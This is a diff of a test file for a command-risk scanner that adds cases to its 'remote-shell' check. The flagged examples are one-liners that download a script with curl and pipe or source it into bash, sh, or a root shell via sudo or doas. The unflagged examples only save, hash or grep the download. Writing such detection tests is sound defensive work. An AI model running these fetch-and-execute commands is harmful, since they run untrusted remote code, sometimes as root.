@@ -37,6 +37,12 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `bash -c "$(curl -fsSL ${URL})"`,
     `sh -c "\`curl -fsSL ${URL}\`"`,
     `bash <(curl -fsSL ${URL})`,
+    `. <(curl -fsSL ${URL})`,
+    `cd /tmp && . <(curl -fsSL ${URL})`,
+    `curl -s ${URL} | env -i bash`,
+    `curl -s ${URL} | sudo -u root bash`,
+    `curl -s ${URL} | doas -u root /bin/sh`,
+    `curl -s "${URL}?a=1&b=2" | sh`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -48,7 +54,16 @@ describe("a command that downloads a script and runs it is a remote shell howeve
 });
 
 describe("commands that do not run what they download are not", () => {
-  for (const cmd of [`curl -fsSL "${URL}" -o x.sh`, `curl -s "${URL}" | shasum -a 256`, `curl -fsSL "${URL}" || bash fallback.sh`, `curl -s "${URL}" | grep version`]) {
+  for (const cmd of [
+    `curl -fsSL "${URL}" -o x.sh`,
+    `curl -s "${URL}" | shasum -a 256`,
+    `curl -fsSL "${URL}" || bash fallback.sh`,
+    `curl -s "${URL}" | grep version`,
+    // a pipe inside a quoted argument is part of the URL, not a pipe
+    `curl "https://example.invalid/search?q=foo|sh"`,
+    `curl -s 'https://example.invalid/a|bash' -o out.txt`,
+    `curl -s "${URL}" | sudo tee /etc/app/x.sh`,
+  ]) {
     test(cmd, () => {
       expect(scoreOf(cmd).ids).not.toContain("remote-shell");
     });
